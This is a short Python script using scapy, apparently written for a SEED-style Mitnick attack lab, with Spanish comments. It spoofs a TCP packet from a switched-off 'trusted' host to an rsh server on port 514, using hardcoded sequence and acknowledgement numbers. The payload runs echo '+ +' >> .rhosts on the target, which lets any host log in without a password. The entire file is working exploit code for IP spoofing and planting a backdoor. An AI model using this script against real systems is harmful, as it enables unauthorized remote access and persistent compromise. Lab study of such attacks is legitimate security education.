#!/usr/bin/python3
from scapy.all import *

#La maquina src es la Trusted, que esta apagada
ip = IP(src="10.9.0.6", dst="10.9.0.5")
#seq y puertos se obtienen del ejemplo de listing 1
tcp = TCP(sport=1023, dport=514, flags="A", seq=778933537, ack=3646100477)

data = '9090\x00seed\x00seed\x00echo "+ +" >> .rhosts\x00'
package_syn = ip/tcp/data
ls(package_syn)
send(package_syn,verbose=0)